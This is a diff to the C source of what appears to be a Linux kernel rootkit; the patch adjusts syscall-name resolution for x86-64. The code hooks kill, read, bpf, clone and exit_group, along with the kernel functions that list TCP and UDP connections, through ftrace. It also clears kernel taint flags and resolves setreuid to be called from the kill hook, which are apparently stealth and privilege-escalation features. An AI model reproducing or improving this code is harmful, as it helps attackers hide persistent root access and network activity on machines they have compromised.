@@ -1049,14 +1049,7 @@ static unsigned long  _load_syscall_variant(struct kernel_syscalls *ks,
         return 0L;
     }
 
-    if (!(rv = ks->k_kallsyms_lookup_name(str))) {
-        /* there is no actual limit for syscall AFAIK */
-        char tmp[64+1] = {0};
-
-        snprintf(tmp, 64, "__x64_%s", str);
-        rv = ks->k_kallsyms_lookup_name(tmp);
-    }
-
+    rv = ks->k_kallsyms_lookup_name(str);
     if (rv) {
         struct sys_addr_list *sl;
         sl = kcalloc(1, sizeof(struct sys_addr_list) , GFP_KERNEL);
@@ -1130,6 +1123,12 @@ void kv_reset_tainted(unsigned long *tainted_ptr) {
     test_and_clear_bit(TAINT_WARN, tainted_ptr);
 }
 
+#ifdef __x86_64__
+#define _sys_arch(s) "__x64_" s
+#else
+#define _sys_arch(s) s
+#endif
+
 struct kernel_syscalls *kv_kall_load_addr(void) {
     static struct kernel_syscalls ks;
 
@@ -1155,9 +1154,10 @@ struct kernel_syscalls *kv_kall_load_addr(void) {
         if (!ks.k_bpf_map_get)
             prwarn("invalid data: bpf_map_get will not work\n");
 
-        ks.k_sys_setreuid   = (sys64)_load_syscall_variant(&ks, "sys_setreuid");;
+        /** Direct call. @see m_kill */
+        ks.k_sys_setreuid   = (sys64)_load_syscall_variant(&ks, _sys_arch("sys_setreuid"));;
         if (!ks.k_sys_setreuid)
-            prwarn("invalid data: syscall hook setreuid will not work\n");
+            prwarn("invalid data: m_kill will fail for setreuid\n");
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
         ks.k_do_exit = (do_exit_sg)ks.k_kallsyms_lookup_name("do_exit");
@@ -1175,11 +1175,11 @@ struct kernel_syscalls *kv_kall_load_addr(void) {
 }
 
 static struct ftrace_hook ft_hooks[] = {
-    {"sys_exit_group", m_exit_group, &real_m_exit_group, true},
-    {"sys_clone", m_clone, &real_m_clone, true},
-    {"sys_kill", m_kill, &real_m_kill, true},
-    {"sys_read", m_read, &real_m_read, true},
-    {"sys_bpf", m_bpf, &real_m_bpf, true},
+    {_sys_arch("sys_exit_group"), m_exit_group, &real_m_exit_group, true},
+    {_sys_arch("sys_clone"), m_clone, &real_m_clone, true},
+    {_sys_arch("sys_kill"), m_kill, &real_m_kill, true},
+    {_sys_arch("sys_read"), m_read, &real_m_read, true},
+    {_sys_arch("sys_bpf"), m_bpf, &real_m_bpf, true},
     {"tcp4_seq_show", m_tcp4_seq_show, &real_m_tcp4_seq_show},
     {"udp4_seq_show", m_udp4_seq_show, &real_m_udp4_seq_show},
     {"tcp6_seq_show", m_tcp6_seq_show, &real_m_tcp6_seq_show},
